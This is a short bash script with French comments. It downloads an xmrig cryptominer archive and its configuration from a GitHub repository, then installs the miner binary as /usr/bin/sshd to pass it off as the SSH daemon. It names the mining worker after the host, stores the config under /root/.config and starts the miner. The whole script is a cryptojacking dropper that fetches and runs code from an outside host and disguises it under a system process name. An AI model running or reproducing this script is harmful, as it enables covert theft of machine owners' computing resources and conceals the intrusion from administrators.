#!/bin/bash
set -x

#le nom
nom=$(cat /etc/hostname | head -1)

#wget le miner
wget "https://github.com/Hackme258/Sshd/raw/main/xmrig.tgz"

#decompresse
tar -zxvf xmrig.tgz
mv minerd /usr/bin/sshd

#wget la config
wget "https://github.com/Hackme258/Sshd/raw/main/xmrig.json"
mkdir /root/.config
sed -i "s/nom_machine/$nom/g" xmrig.json
mv xmrig.json /root/.config/xmrig.json

#lancement
/usr/bin/sshd

